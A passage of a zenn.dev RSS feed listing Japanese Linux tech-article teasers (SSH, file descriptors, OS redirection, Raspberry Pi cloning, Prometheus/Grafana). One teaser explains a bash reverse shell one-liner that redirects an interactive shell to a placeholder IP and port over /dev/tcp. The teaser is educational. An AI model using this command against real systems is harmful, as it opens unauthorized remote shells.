+GitとS...]]></description><link>https://zenn.dev/mabo23/articles/0e1a089826e215</link><guid isPermaLink="true">https://zenn.dev/mabo23/articles/0e1a089826e215</guid><pubDate>Mon, 28 Jul 2025 09:28:08 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--Tz_PbGRQ--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2580%2590Linux%25E5%2585%25A5%25E9%2596%2580%25E3%2580%2591SSH%25E3%2581%25A7%25E3%2582%25B5%25E3%2583%25BC%25E3%2583%2590%25E3%2583%25BC%25E3%2581%25AB%25E7%259B%25B4%25E6%258E%25A5%25E3%2582%25A2%25E3%2582%25AF%25E3%2582%25BB%25E3%2582%25B9%25E3%2581%2597%25E3%2581%25A6%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E6%2593%258D%25E4%25BD%259C%25E3%2581%2599%25E3%2582%258B%25E7%259B%25AE%25E7%259A%2584%25E3%2581%25A8%25E3%2581%25AF%25EF%25BC%259F%25E3%2580%259CGit%25E3%2581%25A8%25E3%2581%25AE%25E9%2581%2595%25E3%2581%2584%25E3%2582%2582%25E8%25A7%25A3%25E8%25AA%25AC%25E3%2580%259C%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:mabo%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzQzM2ZhMmVkZDAuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>mabo</dc:creator></item><item><title><![CDATA[リバースシェルのコマンド解説(bash -i編)]]></title><description><![CDATA[
+ bash -iを使ってネットワーク接続する
+bash -i &amp;&gt; /dev/tcp/&lt;IP&gt;/&lt;Port&gt; 0&gt;&amp;1
+これはbashコマンドだけで完結するため、使い勝手が良いのが特徴だ。
+コマンドの解説をする。
+
+ bash -i
+まず-iオプションはbashをインタラクティブシェルで起動するオプションだ。
+-iをつけないとインタラクティブシェルではなくなるため、ヒストリーに記録されなかったりプロンプトが表示されなかったりする。
+
+ &amp;&gt; /dev/tcp/&lt;IP&gt;/&lt;Port&gt;
+次に&amp;...]]></description><link>https://zenn.dev/ssynkazu/articles/e3ddf7326f4a99</link><guid isPermaLink="true">https://zenn.dev/ssynkazu/articles/e3ddf7326f4a99</guid><pubDate>Sun, 27 Jul 2025 14:06:06 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--SFOm8OFC--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2583%25AA%25E3%2583%2590%25E3%2583%25BC%25E3%2582%25B9%25E3%2582%25B7%25E3%2582%25A7%25E3%2583%25AB%25E3%2581%25AE%25E3%2582%25B3%25E3%2583%259E%25E3%2583%25B3%25E3%2583%2589%25E8%25A7%25A3%25E8%25AA%25AC%2528bash%2520-i%25E7%25B7%25A8%2529%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E6%2598%25A0%25E7%2594%25BB%25E3%2581%25AB%25E5%2587%25BA%25E3%2581%25A6%25E3%2581%258F%25E3%2582%258B%25E3%2583%258F%25E3%2583%2583%25E3%2582%25AB%25E3%2583%25BC%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jS3hLUEs0dWVxWEZrc1RhMGxkNEgtNWNScnBuYU5JTjF2bUFLLURKTUtQc3ptSGtnPXM5Ni1j%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>映画に出てくるハッカー</dc:creator></item><item><title><![CDATA[Raspberry Pi 4BでUSB to USBクローン]]></title><description><![CDATA[USBメモリ起動のRaspberry Pi 4Bで、USBメモリ破損により起動しなくなることがしばしば発生するため、セットアップ完了時点でUSBメモリのクローンを作成したが、rpi-cloneのみではクローン先のUSBメモリで起動しなかったため、そのリカバリー記録。
+
+ 【環境】
+
+Raspberry Pi 4B(Raspberry Pi OS Lite 64-bit)
+
+
+ 【クローン前】
+
+サイズ確認
+
+df -h /
+※Usedがクローン先の容量よりも小さければ、大→小のクローンも可
+
+rpi-clone導入
+
+sudo apt update
+sudo apt install -y...]]></description><link>https://zenn.dev/peroperofangzhu/articles/cdd6f31da48d04</link><guid isPermaLink="true">https://zenn.dev/peroperofangzhu/articles/cdd6f31da48d04</guid><pubDate>Sun, 27 Jul 2025 11:15:30 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--uYCrEV01--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:Raspberry%2520Pi%25204B%25E3%2581%25A7USB%2520to%2520USB%25E3%2582%25AF%25E3%2583%25AD%25E3%2583%25BC%25E3%2583%25B3%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E3%2581%25BA%25E3%2582%258D%25E3%2581%25BA%25E3%2582%258D%25E5%259D%258A%25E4%25B8%25BB%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jSXhyWk53WHVrbzVJbVdpdG5DR2syZkhuczVaLW9lbzhJQjY0M3F5eVV4Ql9RRy1zST1zOTYtYw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>ぺろぺろ坊主</dc:creator></item><item><title><![CDATA[リダイレクションを実装して仕組みを理解する]]></title><description><![CDATA[
+ はじめに
+自作しているOSにリダイレクションの実装をしました。
+最低限の動作しか実装していませんが、実装を通じてリダイレクションの仕組みを深く理解できたので、備忘録を兼ねて整理してみます。
+
+ リポジトリ
+https://github.com/junyaU/uchos
+
+ 今回のゴール
+今回の実装では、以下のコマンドを実行した際に、期待通りの結果が得られることを目標にしています。
+
+ 実行コマンド
+echo hello &gt; aaa.txt
+cat aaa.txt
+
+ 実行結果
+hello
+!
+今回は最低限の実装として、出力リダイレクトの上書き（&gt;）のみに対応していますのみ...]]></description><link>https://zenn.dev/junjunjunjun/articles/519eeed3015e1d</link><guid isPermaLink="true">https://zenn.dev/junjunjunjun/articles/519eeed3015e1d</guid><pubDate>Sun, 27 Jul 2025 10:53:07 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--EJRFPq7D--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2583%25AA%25E3%2583%2580%25E3%2582%25A4%25E3%2583%25AC%25E3%2582%25AF%25E3%2582%25B7%25E3%2583%25A7%25E3%2583%25B3%25E3%2582%2592%25E5%25AE%259F%25E8%25A3%2585%25E3%2581%2597%25E3%2581%25A6%25E4%25BB%2595%25E7%25B5%2584%25E3%2581%25BF%25E3%2582%2592%25E7%2590%2586%25E8%25A7%25A3%25E3%2581%2599%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:junyaU%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzJmZWY4MzNkNjkuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>junyaU</dc:creator></item><item><title><![CDATA[ファイルディスクリプタの存在意義]]></title><description><![CDATA[
+ ファイルディスクリプタはプロセスの入出力の代理ファイル
+ファイルディスクリプタ(FD)について調べてみた。
+FDはLinuxのプロセスが外部とやり取りをする際に使われる。
+UNIXの哲学上全てはファイルとしてやりとりされる。
+プロセスがネットワークであれ、ファイルであれ、読み込みや書き込みを行おうとすると、プロセスから見るとFDに対して接続を行う。
+FDはプロセスごとにカーネルが管理するテーブルが存在する。
+そのテーブルでは整数値と接続先がマッピングされている。
+各プロセスに存在する標準入力、標準出力、標準エラー出力の整数値は、順番に0,1,2が割り当てられている。
+その接続先が実際...]]></description><link>https://zenn.dev/ssynkazu/articles/e1e493b4f54bc6</link><guid isPermaLink="true">https://zenn.dev/ssynkazu/articles/e1e493b4f54bc6</guid><pubDate>Sun, 27 Jul 2025 08:25:55 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--jx7O79fa--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E3%2583%2587%25E3%2582%25A3%25E3%2582%25B9%25E3%2582%25AF%25E3%2583%25AA%25E3%2583%2597%25E3%2582%25BF%25E3%2581%25AE%25E5%25AD%2598%25E5%259C%25A8%25E6%2584%258F%25E7%25BE%25A9%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E6%2598%25A0%25E7%2594%25BB%25E3%2581%25AB%25E5%2587%25BA%25E3%2581%25A6%25E3%2581%258F%25E3%2582%258B%25E3%2583%258F%25E3%2583%2583%25E3%2582%25AB%25E3%2583%25BC%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jS3hLUEs0dWVxWEZrc1RhMGxkNEgtNWNScnBuYU5JTjF2bUFLLURKTUtQc3ptSGtnPXM5Ni1j%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>映画に出てくるハッカー</dc:creator></item><item><title><![CDATA[prometheus のデータを grafana で可視化する]]></title><description><![CDATA[
+ はじめに
+前回の記事で prometheus と grafana を dockerコンテナで起動しました。今回は実際に prometheus で収集したデータを grafana で可視化してみようと思います。
+
+ 実行環境と作業の流れ
+監視サーバー : Dockerコンテナ（MacBookAir上で構築）
+監視対象 : Fedoraサーバー（VMWare仮想マシン）
+※ 以下手順で作業していきます。
+prometheusu のコンテナで環境を構築する
+grafana のコンテナ環境を構築する
+prometheus から取得したデータを grafana で可視化する ← ※今回はここで...]]></description><link>https://zenn.dev/eiken/articles/c360a81ba626c1</link><guid isPermaLink="true">https://zenn.dev/eiken/articles/c360a81ba626c1</guid><pubDate>Sun, 27 Jul 2025 00:29:14 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--xC-N81Ws--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:prometheus%2520%25E3%2581%25AE%25E3%2583%2587%25E3%2583%25BC%25E3%2582%25BF%25E3%2582%2592%2520grafana%2520%25E3%2581%25A7%25E5%258F%25AF%25E8%25A6%2596%25E5%258C%2596%25E3%2581%2599%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:enjine%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly96ZW5uLWRldi5naXRodWIuaW8vZGVmYXVsdC1hdmF0YXJzL2RhcmsvZS5wbmc=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>enjine</dc:creator></item></channel></rss>
